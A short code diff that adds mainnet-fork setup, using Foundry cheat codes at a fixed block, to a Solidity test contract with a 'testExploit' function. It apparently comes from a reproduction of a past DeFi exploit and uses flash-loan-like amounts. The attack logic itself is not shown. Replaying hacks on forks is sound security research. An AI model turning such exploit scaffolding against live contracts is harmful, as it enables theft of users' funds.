@@ -27,6 +27,13 @@ contract ContractTest is DSTest {
     uint256[] amounts = [2700000000000];
     uint256[] modes = [0];
     uint256[3] amounts2 = [0, 22500000000, 0];
+    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    uint256 mainnetFork;
+    
+    function setUp() public {
+        mainnetFork = cheats.createFork("https://rpc.ankr.com/eth", 14972418); // fork mainnet at block 14972418
+        cheats.selectFork(mainnetFork);
+    }
 
     
     function testExploit() public{
